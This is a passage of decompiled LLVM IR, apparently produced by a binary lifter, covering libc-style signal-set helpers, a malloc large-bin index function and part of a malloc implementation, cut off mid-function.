  %v3_804fbb2 = load i32, i32* %stack_var_-284, align 4
  br label %dec_label_pc_804fbbb

dec_label_pc_804fbb8:                             ; preds = %dec_label_pc_804fb77, %dec_label_pc_804fb60, %dec_label_pc_804fb37
  br label %dec_label_pc_804fbbb

dec_label_pc_804fbbb:                             ; preds = %dec_label_pc_804fbb2, %dec_label_pc_804fbb8
  %storemerge = phi i32 [ -1, %dec_label_pc_804fbb8 ], [ %v3_804fbb2, %dec_label_pc_804fbb2 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_804fb14, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_804fb5d, { 2, 1, 0 }
  uselistorder i32* %stack_var_-144, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 9, 0, 1, 2, 3, 4, 7, 8, 5, 6 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 1, 4, 0, 5 }
  uselistorder label %dec_label_pc_804fbbb, { 1, 0 }
}

define i32 @__sigismember(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_804fbd2 = add i32 %arg2, -1
  %v1_804fbd5 = urem i32 %v1_804fbd2, 32
  %v2_804fbd5 = icmp eq i32 %v1_804fbd5, 0
  %v2_804fbd8 = udiv i32 %v1_804fbd2, 32
  br i1 %v2_804fbd5, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v5_804fbdb = shl i32 1, %v1_804fbd5
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_804fbdd = phi i32 [ 1, %entry ], [ %v5_804fbdb, %bb ]
  %v2_804fbdd = mul nuw nsw i32 %v2_804fbd8, 4
  %v3_804fbdd = add i32 %v2_804fbdd, %arg1
  %v4_804fbdd = inttoptr i32 %v3_804fbdd to i32*
  %v5_804fbdd = load i32, i32* %v4_804fbdd, align 4
  %v7_804fbdd = and i32 %v5_804fbdd, %v6_804fbdd
  %v8_804fbdd = icmp eq i32 %v7_804fbdd, 0
  %v1_804fbe1 = icmp eq i1 %v8_804fbdd, false
  %v2_804fbe1 = zext i1 %v1_804fbe1 to i32
  ret i32 %v2_804fbe1

; uselistorder directives
  uselistorder i32 %v1_804fbd5, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__sigaddset(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804fbe8 = load i32, i32* @ebx, align 4
  store i32 %v0_804fbe8, i32* %stack_var_-4, align 4
  %v1_804fbf6 = add i32 %arg2, -1
  %v1_804fbf9 = urem i32 %v1_804fbf6, 32
  %v2_804fbf9 = icmp eq i32 %v1_804fbf9, 0
  store i32 %v1_804fbf9, i32* @ecx, align 4
  %v2_804fbfc = udiv i32 %v1_804fbf6, 32
  store i32 %v2_804fbfc, i32* @edx, align 4
  br i1 %v2_804fbf9, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v5_804fbff = shl i32 1, %v1_804fbf9
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_804fc01 = phi i32 [ 1, %entry ], [ %v5_804fbff, %bb ]
  %v2_804fc01 = mul nuw nsw i32 %v2_804fbfc, 4
  %v3_804fc01 = add i32 %v2_804fc01, %arg1
  %v4_804fc01 = inttoptr i32 %v3_804fc01 to i32*
  %v5_804fc01 = load i32, i32* %v4_804fc01, align 4
  %v7_804fc01 = or i32 %v5_804fc01, %v6_804fc01
  store i32 %v7_804fc01, i32* %v4_804fc01, align 4
  %v2_804fc06 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fc06, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_804fbfc, { 1, 0 }
  uselistorder i32 %v1_804fbf9, { 2, 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_804fc16 = add i32 %arg2, -1
  %v1_804fc19 = urem i32 %v1_804fc16, 32
  %v2_804fc19 = icmp eq i32 %v1_804fc19, 0
  %v2_804fc1c = udiv i32 %v1_804fc16, 32
  br i1 %v2_804fc19, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v4_804fc1f = shl i32 -2, %v1_804fc19
  %v5_804fc1f = sub nsw i32 32, %v1_804fc19
  %v6_804fc1f = lshr i32 -2, %v5_804fc1f
  %v7_804fc1f = or i32 %v6_804fc1f, %v4_804fc1f
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_804fc21 = phi i32 [ -2, %entry ], [ %v7_804fc1f, %bb ]
  %v2_804fc21 = mul nuw nsw i32 %v2_804fc1c, 4
  %v3_804fc21 = add i32 %v2_804fc21, %arg1
  %v4_804fc21 = inttoptr i32 %v3_804fc21 to i32*
  %v5_804fc21 = load i32, i32* %v4_804fc21, align 4
  %v7_804fc21 = and i32 %v5_804fc21, %v6_804fc21
  store i32 %v7_804fc21, i32* %v4_804fc21, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_804fc19, { 1, 2, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__malloc_largebin_index() local_unnamed_addr {
entry:
  %v0_804fc28 = load i32, i32* @eax, align 4
  %v6_804fc3b = icmp ugt i32 %v0_804fc28, 16777215
  br i1 %v6_804fc3b, label %dec_label_pc_804fc4c, label %dec_label_pc_804fc3d

dec_label_pc_804fc3d:                             ; preds = %entry
  %tmp = icmp ult i32 %v0_804fc28, 256
  %v2_804fc2b = udiv i32 %v0_804fc28, 256
  %v2_804fc3d = call i32 @llvm.ctlz.i32(i32 %v2_804fc2b, i1 true)
  %v3_804fc3d = xor i32 %v2_804fc3d, 31
  %v5_804fc3d = select i1 %tmp, i32 95, i32 %v3_804fc3d
  %v1_804fc40 = add nuw nsw i32 %v5_804fc3d, 6
  store i32 %v1_804fc40, i32* @ecx, align 4
  %v2_804fc43 = urem i32 %v1_804fc40, 32
  %v4_804fc43 = icmp eq i32 %v2_804fc43, 0
  br i1 %v4_804fc43, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_804fc3d
  %v5_804fc43 = lshr i32 %v0_804fc28, %v2_804fc43
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_804fc3d, %bb
  %v0_804fc45 = phi i32 [ %v0_804fc28, %dec_label_pc_804fc3d ], [ %v5_804fc43, %bb ]
  %v1_804fc45 = urem i32 %v0_804fc45, 4
  %v2_804fc48 = mul nuw nsw i32 %v5_804fc3d, 4
  %v3_804fc48 = or i32 %v1_804fc45, 32
  %v4_804fc48 = add nuw nsw i32 %v3_804fc48, %v2_804fc48
  br label %dec_label_pc_804fc4c

dec_label_pc_804fc4c:                             ; preds = %entry, %bb4
  %v0_804fc4d = phi i32 [ 95, %entry ], [ %v4_804fc48, %bb4 ]
  ret i32 %v0_804fc4d

; uselistorder directives
  uselistorder i32 %v2_804fc43, { 1, 0 }
  uselistorder i32 %v0_804fc28, { 2, 3, 1, 0, 4 }
  uselistorder label %dec_label_pc_804fc4c, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804fc4e = load i32, i32* @ebp, align 4
  %v0_804fc4f = load i32, i32* @edi, align 4
  %v0_804fc50 = load i32, i32* @esi, align 4
  %v0_804fc51 = load i32, i32* @ebx, align 4
  store i32 %v0_804fc51, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_804fc63 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804fc63, i32* @eax, align 4
  store i32 %v2_804fc63, i32* %stack_var_-92, align 4
  %v2_804fc68 = call i32 @__pthread_return_void(i32 %v2_804fc63, i32 134550743)
  store i32 %v2_804fc68, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8058370.214 to i32), i32* %stack_var_-92, align 4
  %v1_804fc74 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8058370.214 to i32))
  store i32 %v1_804fc74, i32* %eax.global-to-local, align 4
  %v0_804fc7c = load i32, i32* %ebx.global-to-local, align 4
  %tmp125 = icmp ult i32 %v0_804fc7c, -32
  br i1 %tmp125, label %dec_label_pc_804fc93, label %dec_label_pc_804fc81

dec_label_pc_804fc81:                             ; preds = %entry
  %v0_804fc81 = load i32, i32* %stack_var_-92, align 4
  %v1_804fc81 = call i32 @__errno_location(i32 %v0_804fc81)
  store i32 %v1_804fc81, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_804fc88 = inttoptr i32 %v1_804fc81 to i32*
  store i32 12, i32* %v1_804fc88, align 4
  br label %dec_label_pc_80503b8

dec_label_pc_804fc93:                             ; preds = %entry
  %v1_804fc93 = add i32 %v0_804fc7c, 11
  %tmp126 = icmp ult i32 %v1_804fc93, 16
  br i1 %tmp126, label %dec_label_pc_804fcaa, label %dec_label_pc_804fca3

dec_label_pc_804fca3:                             ; preds = %dec_label_pc_804fc93
  %v1_804fca3 = and i32 %v1_804fc93, -8
  br label %dec_label_pc_804fcaa

dec_label_pc_804fcaa:                             ; preds = %dec_label_pc_804fc93, %dec_label_pc_804fca3
  %storemerge136 = phi i32 [ %v1_804fca3, %dec_label_pc_804fca3 ], [ %v1_804fc93, %dec_label_pc_804fc93 ]
  %v1_8050042 = phi i32 [ %v1_804fca3, %dec_label_pc_804fca3 ], [ 16, %dec_label_pc_804fc93 ]
  store i32 %storemerge136, i32* %eax.global-to-local, align 4
  %v0_804fcaa = load i8, i8* @global_var_805e7e0.215, align 1
  %v1_804fcaa = sext i8 %v0_804fcaa to i32
  store i32 %v1_804fcaa, i32* @ebx, align 4
  %v3_804fcb0 = urem i8 %v0_804fcaa, 2
  %v4_804fcb0 = icmp eq i8 %v3_804fcb0, 0
  %v1_804fcb3 = icmp eq i1 %v4_804fcb0, false
  br i1 %v1_804fcb3, label %dec_label_pc_804fcd2, label %dec_label_pc_804fcb5

dec_label_pc_804fcb5:                             ; preds = %dec_label_pc_804fcaa
  %v2_804fcb5 = icmp eq i8 %v0_804fcaa, 0
  %v1_804fcb7 = icmp eq i1 %v2_804fcb5, false
  br i1 %v1_804fcb7, label %dec_label_pc_804ffad, label %dec_label_pc_804fcbd

dec_label_pc_804fcbd:                             ; preds = %dec_label_pc_804fcb5
  store i32 ptrtoint (i8* @global_var_805e7e0.215 to i32), i32* %stack_var_-92, align 4
  %v2_804fcc5 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_805e7e0.215 to i32*))
  store i32 %v2_804fcc5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ffad

dec_label_pc_804fcd2:                             ; preds = %dec_label_pc_804fcaa
  %v11_804fcd2 = trunc i32 %v1_8050042 to i8
  %v8_804fcd6 = icmp ugt i8 %v11_804fcd2, %v0_804fcaa
  br i1 %v8_804fcd6, label %dec_label_pc_804fcf3, label %dec_label_pc_804fcd8

dec_label_pc_804fcd8:                             ; preds = %dec_label_pc_804fcd2
  %v2_804fcdc = udiv i32 %v1_8050042, 2
  store i32 %v2_804fcdc, i32* %eax.global-to-local, align 4
  %v1_804fcde = add i32 %v2_804fcdc, ptrtoint (i8* @global_var_805e7e0.215 to i32)
  store i32 %v1_804fcde, i32* @ecx, align 4
  %v1_804fce4 = add i32 %v2_804fcdc, add (i32 ptrtoint (i8* @global_var_805e7e0.215 to i32), i32 -4)
  %v2_804fce4 = inttoptr i32 %v1_804fce4 to i32*
  %v3_804fce4 = load i32, i32* %v2_804fce4, align 4
  store i32 %v3_804fce4, i32* @edx, align 4
  %v1_804fce7 = icmp eq i32 %v3_804fce4, 0
  br i1 %v1_804fce7, label %dec_label_pc_804fcf3, label %dec_label_pc_804fceb

dec_label_pc_804fceb:                             ; preds = %dec_label_pc_804fcd8
  %v1_804fceb = add i32 %v3_804fce4, 8
  %v2_804fceb = inttoptr i32 %v1_804fceb to i32*
  %v3_804fceb = load i32, i32* %v2_804fceb, align 4
  store i32 %v3_804fceb, i32* %eax.global-to-local, align 4
  store i32 %v3_804fceb, i32* %v2_804fce4, align 4
  br label %dec_label_pc_804fd2c

dec_label_pc_804fcf3:                             ; preds = %dec_label_pc_804fcd8, %dec_label_pc_804fcd2
  %v8_804fcf3 = icmp ult i32 %v1_8050042, 255
  %v6_804fcfb = icmp ugt i32 %v1_8050042, 255
  store i32 %v1_8050042, i32* @eax, align 4
  br i1 %v6_804fcfb, label %dec_label_pc_804fd34, label %dec_label_pc_804fcfd

dec_label_pc_804fcfd:                             ; preds = %dec_label_pc_804fcf3
  %v2_804fd01 = udiv i32 %v1_8050042, 8
  store i32 %v2_804fd01, i32* %eax.global-to-local, align 4
  %v1_804fd08 = mul nuw i32 %v2_804fd01, 8
  %v2_804fd08 = add i32 %v1_804fd08, ptrtoint (i32* @global_var_805e80c.216 to i32)
  store i32 %v2_804fd08, i32* @ecx, align 4
  %v1_804fd0f = add i32 %v1_804fd08, add (i32 ptrtoint (i32* @global_var_805e80c.216 to i32), i32 12)
  %v2_804fd0f = inttoptr i32 %v1_804fd0f to i32*
  %v3_804fd0f = load i32, i32* %v2_804fd0f, align 4
  store i32 %v3_804fd0f, i32* @edx, align 4
  %v12_804fd12 = icmp eq i32 %v3_804fd0f, %v2_804fd08
  br i1 %v12_804fd12, label %dec_label_pc_804fe30.preheader, label %dec_label_pc_804fd1a

dec_label_pc_804fd1a:                             ; preds = %dec_label_pc_804fcfd
  store i32 %v1_8050042, i32* %ebx.global-to-local, align 4
  %v1_804fd1e = add i32 %v3_804fd0f, 12
  %v2_804fd1e = inttoptr i32 %v1_804fd1e to i32*
  %v3_804fd1e = load i32, i32* %v2_804fd1e, align 4
  store i32 %v3_804fd1e, i32* %eax.global-to-local, align 4
  store i32 %v3_804fd1e, i32* %v2_804fd0f, align 4
  %v0_804fd24 = load i32, i32* @edx, align 4
  %v1_804fd24 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804fd24 = add i32 %v0_804fd24, 4
  %v3_804fd24 = add i32 %v2_804fd24, %v1_804fd24
  %v4_804fd24 = inttoptr i32 %v3_804fd24 to i32*
  %v5_804fd24 = load i32, i32* %v4_804fd24, align 4
  %v6_804fd24 = or i32 %v5_804fd24, 1
  store i32 %v6_804fd24, i32* %v4_804fd24, align 4
  %v0_804fd29 = load i32, i32* @ecx, align 4
  %v1_804fd29 = load i32, i32* %eax.global-to-local, align 4
  %v2_804fd29 = add i32 %v1_804fd29, 8
  %v3_804fd29 = inttoptr i32 %v2_804fd29 to i32*
  store i32 %v0_804fd29, i32* %v3_804fd29, align 4
  br label %dec_label_pc_804fd2c

dec_label_pc_804fd2c:                             ; preds = %dec_label_pc_80500c9, %dec_label_pc_80500db, %dec_label_pc_804fceb, %dec_label_pc_804fd1a
  %v0_804fd2c = load i32, i32* @edx, align 4
  %v1_804fd2c = add i32 %v0_804fd2c, 8
  store i32 %v1_804fd2c, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80503a7

dec_label_pc_804fd34:                             ; preds = %dec_label_pc_804fcf3
  %v0_804fd38 = call i32 @__malloc_largebin_index()
  store i32 %v0_804fd38, i32* %eax.global-to-local, align 4
  %v3_804fd3d = and i8 %v0_804fcaa, 2
  %v4_804fd3d = icmp eq i8 %v3_804fd3d, 0
  %v6_804fd3d = zext i8 %v3_804fd3d to i32
  %v9_804fd3d = and i32 %v1_804fcaa, -256
  %v10_804fd3d = or i32 %v9_804fd3d, %v6_804fd3d
  store i32 %v10_804fd3d, i32* @ebx, align 4
  br i1 %v4_804fd3d, label %dec_label_pc_804fe30.preheader, label %dec_label_pc_804fd4a

dec_label_pc_804fd4a:                             ; preds = %dec_label_pc_804fd34
  store i32 ptrtoint (i8* @global_var_805e7e0.215 to i32), i32* %stack_var_-92, align 4
  %v2_804fd52 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_805e7e0.215 to i32*))
  store i32 %v2_804fd52, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fe30.preheader

dec_label_pc_804fe30.preheader:                   ; preds = %dec_label_pc_804fd4a, %dec_label_pc_804fcfd, %dec_label_pc_804fd34
  %stack_var_-40.0.ph = phi i32 [ %v2_804fd01, %dec_label_pc_804fcfd ], [ %v0_804fd38, %dec_label_pc_804fd4a ], [ %v0_804fd38, %dec_label_pc_804fd34 ]
  %v1_804fd86 = add i32 %v1_8050042, 16
  %v0_804fe30107 = load i32, i32* @global_var_805e820.219, align 32
  store i32 %v0_804fe30107, i32* @ebp, align 4
  %v9_804fe36109 = icmp eq i32 %v0_804fe30107, 134604820
  %v1_804fe3c110 = icmp eq i1 %v9_804fe36109, false
  br i1 %v1_804fe3c110, label %dec_label_pc_804fd5f, label %dec_label_pc_804fe42

dec_label_pc_804fd5f:                             ; preds = %dec_label_pc_804fe30.preheader, %bb84
  %v0_804fe30111 = phi i32 [ %v0_804fe30, %bb84 ], [ %v0_804fe30107, %dec_label_pc_804fe30.preheader ]
  %v1_804fd5f = add i32 %v0_804fe30111, 4
  %v2_804fd5f = inttoptr i32 %v1_804fd5f to i32*
  %v3_804fd5f = load i32, i32* %v2_804fd5f, align 4
  %v1_804fd62 = add i32 %v0_804fe30111, 12
  %v2_804fd62 = inttoptr i32 %v1_804fd62 to i32*
  %v3_804fd62 = load i32, i32* %v2_804fd62, align 4
  store i32 %v3_804fd62, i32* @edx, align 4
  %v1_804fd65 = and i32 %v3_804fd5f, -4
  store i32 %v1_804fd65, i32* @edi, align 4
  br i1 %v6_804fcfb, label %dec_label_pc_804fd91, label %dec_label_pc_804fd72

dec_label_pc_804fd72:                             ; preds = %dec_label_pc_804fd5f
  %v9_804fd72 = icmp eq i32 %v3_804fd62, 134604820
  %v1_804fd78 = icmp eq i1 %v9_804fd72, false
  br i1 %v1_804fd78, label %dec_label_pc_804fd91, label %dec_label_pc_804fd7a

dec_label_pc_804fd7a:                             ; preds = %dec_label_pc_804fd72
  %v1_804fd7a = load i32, i32* @global_var_805e810.217, align 16
  %v12_804fd7a = icmp eq i32 %v0_804fe30111, %v1_804fd7a
  %v1_804fd80 = icmp eq i1 %v12_804fd7a, false
  br i1 %v1_804fd80, label %dec_label_pc_804fd91, label %dec_label_pc_804fd82

dec_label_pc_804fd82:                             ; preds = %dec_label_pc_804fd7a
  store i32 %v1_804fd86, i32* %eax.global-to-local, align 4
  %v6_804fd8b = icmp ugt i32 %v1_804fd65, %v1_804fd86
  br i1 %v6_804fd8b, label %dec_label_pc_8050342, label %dec_label_pc_804fd91

dec_label_pc_804fd91:                             ; preds = %dec_label_pc_804fd82, %dec_label_pc_804fd7a, %dec_label_pc_804fd72, %dec_label_pc_804fd5f
  store i32 ptrtoint (i32* @global_var_805e814.218 to i32), i32* %eax.global-to-local, align 4
  %v2_804fd96 = add i32 %v3_804fd62, 8
  %v3_804fd96 = inttoptr i32 %v2_804fd96 to i32*
  store i32 ptrtoint (i32* @global_var_805e814.218 to i32), i32* %v3_804fd96, align 4
  %v0_804fd99 = load i32, i32* @edx, align 4
  store i32 %v0_804fd99, i32* @global_var_805e820.219, align 4
  %v0_804fd9c = load i32, i32* @edi, align 4
  %v15_804fd9c = icmp eq i32 %v0_804fd9c, %v1_8050042
  br i1 %v15_804fd9c, label %dec_label_pc_8050383, label %dec_label_pc_804fda6

dec_label_pc_804fda6:                             ; preds = %dec_label_pc_804fd91
  %v6_804fdac = icmp ugt i32 %v0_804fd9c, 255
  br i1 %v6_804fdac, label %dec_label_pc_804fdbf, label %dec_label_pc_804fdae

dec_label_pc_804fdae:                             ; preds = %dec_label_pc_804fda6
  %v2_804fdb0 = udiv i32 %v0_804fd9c, 8
  store i32 %v2_804fdb0, i32* %esi.global-to-local, align 4
  %v1_804fdb3 = mul nuw i32 %v2_804fdb0, 8
  %v2_804fdb3 = add i32 %v1_804fdb3, 134604812
  store i32 %v2_804fdb3, i32* @ebx, align 4
  %v1_804fdba = add i32 %v1_804fdb3, 134604820
  %v2_804fdba = inttoptr i32 %v1_804fdba to i32*
  %v3_804fdba = load i32, i32* %v2_804fdba, align 4
  store i32 %v3_804fdba, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fe08

dec_label_pc_804fdbf:                             ; preds = %dec_label_pc_804fda6
  store i32 %v0_804fd9c, i32* @eax, align 4
  %v0_804fdc1 = call i32 @__malloc_largebin_index()
  store i32 %v0_804fdc1, i32* %esi.global-to-local, align 4
  %v1_804fdc8 = mul i32 %v0_804fdc1, 8
  %v2_804fdc8 = add i32 %v1_804fdc8, ptrtoint (i32* @global_var_805e80c.216 to i32)
  store i32 %v2_804fdc8, i32* %eax.global-to-local, align 4
  %v1_804fdcf = add i32 %v1_804fdc8, add (i32 ptrtoint (i32* @global_var_805e80c.216 to i32), i32 8)
  %v2_804fdcf = inttoptr i32 %v1_804fdcf to i32*
  %v3_804fdcf = load i32, i32* %v2_804fdcf, align 4
  store i32 %v3_804fdcf, i32* %edx.global-to-local, align 4
  store i32 %v3_804fdcf, i32* @ebx, align 4
  %v12_804fdd8 = icmp eq i32 %v3_804fdcf, %v2_804fdc8
  br i1 %v12_804fdd8, label %dec_label_pc_804fe08, label %dec_label_pc_804fddc

dec_label_pc_804fddc:                             ; preds = %dec_label_pc_804fdbf
  %v1_804fddc = add i32 %v1_804fdc8, add (i32 ptrtoint (i32* @global_var_805e80c.216 to i32), i32 12)
  %v2_804fddc = inttoptr i32 %v1_804fddc to i32*
  %v3_804fddc = load i32, i32* %v2_804fddc, align 4
  store i32 %v3_804fddc, i32* @ebx, align 4
  %v0_804fddf = load i32, i32* @edi, align 4
  %v2_804fddf = add i32 %v3_804fddc, 4
  %v3_804fddf = inttoptr i32 %v2_804fddf to i32*
  %v4_804fddf = load i32, i32* %v3_804fddf, align 4
  %v10_804fddf = icmp ult i32 %v0_804fddf, %v4_804fddf
  %v1_804fde2 = icmp eq i1 %v10_804fddf, false
  br i1 %v1_804fde2, label %dec_label_pc_804fdea, label %dec_label_pc_804fe08

dec_label_pc_804fdea:                             ; preds = %dec_label_pc_804fddc
  %v1_804fdec = or i32 %v0_804fddf, 1
  store i32 %v1_804fdec, i32* %eax.global-to-local, align 4
  store i32 %v3_804fdcf, i32* %ebx.global-to-local, align 4
  %v2_804fe00101 = add i32 %v3_804fdcf, 4
  %v3_804fe00102 = inttoptr i32 %v2_804fe00101 to i32*
  %v4_804fe00103 = load i32, i32* %v3_804fe00102, align 4
  %v10_804fe00104 = icmp ult i32 %v1_804fdec, %v4_804fe00103
  br i1 %v10_804fe00104, label %dec_label_pc_804fdf1, label %dec_label_pc_804fe05

dec_label_pc_804fdf1:                             ; preds = %dec_label_pc_804fdea, %dec_label_pc_804fdf1
  %v0_804fe05105 = phi i32 [ %v3_804fdf5, %dec_label_pc_804fdf1 ], [ %v3_804fdcf, %dec_label_pc_804fdea ]
  store i32 %v0_804fe05105, i32* %ecx.global-to-local, align 4
  %v1_804fdf5 = add i32 %v0_804fe05105, 8
  %v2_804fdf5 = inttoptr i32 %v1_804fdf5 to i32*
  %v3_804fdf5 = load i32, i32* %v2_804fdf5, align 4
  store i32 %v3_804fdf5, i32* %ecx.global-to-local, align 4
  store i32 %v3_804fdf5, i32* %ebx.global-to-local, align 4
  %v2_804fe00 = add i32 %v3_804fdf5, 4
  %v3_804fe00 = inttoptr i32 %v2_804fe00 to i32*
  %v4_804fe00 = load i32, i32* %v3_804fe00, align 4
  %v10_804fe00 = icmp ult i32 %v1_804fdec, %v4_804fe00
  br i1 %v10_804fe00, label %dec_label_pc_804fdf1, label %dec_label_pc_804fe05

dec_label_pc_804fe05:                             ; preds = %dec_label_pc_804fdf1, %dec_label_pc_804fdea
  %v0_804fe05.lcssa = phi i32 [ %v3_804fdcf, %dec_label_pc_804fdea ], [ %v3_804fdf5, %dec_label_pc_804fdf1 ]
  %v1_804fe05 = add i32 %v0_804fe05.lcssa, 12
  %v2_804fe05 = inttoptr i32 %v1_804fe05 to i32*
  %v3_804fe05 = load i32, i32* %v2_804fe05, align 4
  store i32 %v3_804fe05, i32* @ebx, align 4
  br label %dec_label_pc_804fe08

dec_label_pc_804fe08:                             ; preds = %dec_label_pc_804fdae, %dec_label_pc_804fddc, %dec_label_pc_804fdbf, %dec_label_pc_804fe05
  %v0_804fe08 = phi i32 [ %v0_804fdc1, %dec_label_pc_804fdbf ], [ %v0_804fdc1, %dec_label_pc_804fe05 ], [ %v0_804fdc1, %dec_label_pc_804fddc ], [ %v2_804fdb0, %dec_label_pc_804fdae ]
  %stack_var_-64.1 = phi i32 [ %v2_804fdc8, %dec_label_pc_804fdbf ], [ %v0_804fe05.lcssa, %dec_label_pc_804fe05 ], [ %v2_804fdc8, %dec_label_pc_804fddc ], [ %v3_804fdba, %dec_label_pc_804fdae ]
  %v1_804fe0a = urem i32 %v0_804fe08, 32
  %v2_804fe0a = icmp eq i32 %v1_804fe0a, 0
  store i32 %v1_804fe0a, i32* %esi.global-to-local, align 4
  store i32 %v1_804fe0a, i32* @ecx, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_804fe14 = sdiv i32 %v0_804fe08, 32
  store i32 %v2_804fe14, i32* %edx.global-to-local, align 4
  br i1 %v2_804fe0a, label %bb84, label %bb

bb:                                               ; preds = %dec_label_pc_804fe08
  %v5_804fe17 = shl i32 1, %v1_804fe0a
  store i32 %v5_804fe17, i32* %eax.global-to-local, align 4
  br label %bb84

bb84:                                             ; preds = %dec_label_pc_804fe08, %bb
  %v5_804fe19 = phi i32 [ 1, %dec_label_pc_804fe08 ], [ %v5_804fe17, %bb ]
  %v1_804fe19 = mul nsw i32 %v2_804fe14, 4
  %v2_804fe19 = add i32 %v1_804fe19, ptrtoint (i32* @global_var_805eb14.220 to i32)
  %v3_804fe19 = inttoptr i32 %v2_804fe19 to i32*
  %v4_804fe19 = load i32, i32* %v3_804fe19, align 4
  %v6_804fe19 = or i32 %v4_804fe19, %v5_804fe19
  store i32 %v6_804fe19, i32* %v3_804fe19, align 4
  %v0_804fe20 = load i32, i32* @ebx, align 4
  %v1_804fe20 = load i32, i32* @ebp, align 4
  %v2_804fe20 = add i32 %v1_804fe20, 12
  %v3_804fe20 = inttoptr i32 %v2_804fe20 to i32*
  store i32 %v0_804fe20, i32* %v3_804fe20, align 4
  store i32 %stack_var_-64.1, i32* @esi, align 4
  %v1_804fe27 = load i32, i32* @ebp, align 4
  %v2_804fe27 = add i32 %v1_804fe27, 8
  %v3_804fe27 = inttoptr i32 %v2_804fe27 to i32*
  store i32 %stack_var_-64.1, i32* %v3_804fe27, align 4
  %v0_804fe2a = load i32, i32* @ebp, align 4
  %v1_804fe2a = load i32, i32* @ebx, align 4
  %v2_804fe2a = add i32 %v1_804fe2a, 8
  %v3_804fe2a = inttoptr i32 %v2_804fe2a to i32*
  store i32 %v0_804fe2a, i32* %v3_804fe2a, align 4
  %v0_804fe2d = load i32, i32* @ebp, align 4
  %v1_804fe2d = load i32, i32* @esi, align 4
  %v2_804fe2d = add i32 %v1_804fe2d, 12
  %v3_804fe2d = inttoptr i32 %v2_804fe2d to i32*
  store i32 %v0_804fe2d, i32* %v3_804fe2d, align 4
  %v0_804fe30 = load i32, i32* @global_var_805e820.219, align 32
  store i32 %v0_804fe30, i32* @ebp, align 4
  %v9_804fe36 = icmp eq i32 %v0_804fe30, 134604820
  %v1_804fe3c = icmp eq i1 %v9_804fe36, false
  br i1 %v1_804fe3c, label %dec_label_pc_804fd5f, label %dec_label_pc_804fe42

dec_label_pc_804fe42:                             ; preds = %bb84, %dec_label_pc_804fe30.preheader
  br i1 %v8_804fcf3, label %dec_label_pc_804fed0, label %dec_label_pc_804fe50

dec_label_pc_804fe50:                             ; preds = %dec_label_pc_804fe42
  store i32 %stack_var_-40.0.ph, i32* %eax.global-to-local, align 4
  %v1_804fe54 = mul i32 %stack_var_-40.0.ph, 8
  %v2_804fe54 = add i32 %v1_804fe54, ptrtoint (i32* @global_var_805e80c.216 to i32)
  store i32 %v2_804fe54, i32* %edx.global-to-local, align 4
  %v1_804fe5b = add i32 %v1_804fe54, add (i32 ptrtoint (i32* @global_var_805e80c.216 to i32), i32 12)
  %v2_804fe5b = inttoptr i32 %v1_804fe5b to i32*
  %storemerge1.pre = load i32, i32* %v2_804fe5b, align 4
  br label %dec_label_pc_804fecc

dec_label_pc_804fe60:                             ; preds = %dec_label_pc_804fecc
  %v1_804fe60 = add i32 %v4_804fe77, 4
  %v2_804fe60 = inttoptr i32 %v1_804fe60 to i32*
  %v3_804fe60 = load i32, i32* %v2_804fe60, align 4
  store i32 %v3_804fe60, i32* %ebx.global-to-local, align 4
  %v1_804fe63 = add i32 %v4_804fe77, 12
  %v2_804fe63 = inttoptr i32 %v1_804fe63 to i32*
  %v3_804fe63 = load i32, i32* %v2_804fe63, align 4
  store i32 %v3_804fe63, i32* @ecx, align 4
  %v1_804fe66 = and i32 %v3_804fe60, -4
  store i32 %v1_804fe66, i32* @ebx, align 4
  %v10_804fe69 = icmp ult i32 %v1_804fe66, %v1_8050042
  br i1 %v10_804fe69, label %dec_label_pc_804fecc, label %dec_label_pc_804fe6f

dec_label_pc_804fe6f:                             ; preds = %dec_label_pc_804fe60
  %v1_804fe6f = add i32 %v4_804fe77, 8
  %v2_804fe6f = inttoptr i32 %v1_804fe6f to i32*
